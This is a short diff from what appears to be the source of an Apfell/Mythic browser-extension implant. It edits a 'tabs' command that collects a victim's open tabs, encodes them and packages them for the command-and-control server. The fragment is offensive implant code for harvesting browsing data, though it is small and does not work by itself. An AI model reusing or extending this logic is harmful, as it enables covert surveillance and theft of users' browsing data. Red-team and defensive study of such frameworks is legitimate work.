@@ -15,7 +15,7 @@ tabs = function(params) {
             tabs.push(individualTab);
         }
         const data = btoa(unescape(encodeURIComponent(JSON.stringify(tabs))));
-        const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+        const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
         let meta = {};
         meta["metatype"] = 3;
         meta["metadata"] = apfellMsg;
@@ -25,4 +25,4 @@ tabs = function(params) {
 };
 
 C2.commands[tabs.name] = tabs;
-
+COMMAND_ENDS_HERE
